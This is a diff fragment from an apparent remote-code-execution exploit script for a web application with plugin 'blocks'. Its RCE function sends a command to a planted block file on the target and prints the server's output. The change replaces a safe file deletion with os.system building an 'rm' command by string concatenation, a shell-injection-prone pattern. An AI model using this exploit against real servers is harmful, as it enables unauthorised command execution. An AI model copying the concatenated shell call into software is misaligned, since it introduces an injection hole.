@@ -166,7 +166,7 @@ def RCE(url,sess,cadena,command):
 	response=sess.get(url+"/blocks/"+cadena+"/lang/en/block_"+cadena+".php", params=data_get2)
 	print("\n")
 	print(Color.GREEN + response.text + Color.END)
-	os.remove(cadena + ".zip")
+	os.system("rm " + cadena + ".zip")
 
 	
 if __name__ == '__main__':
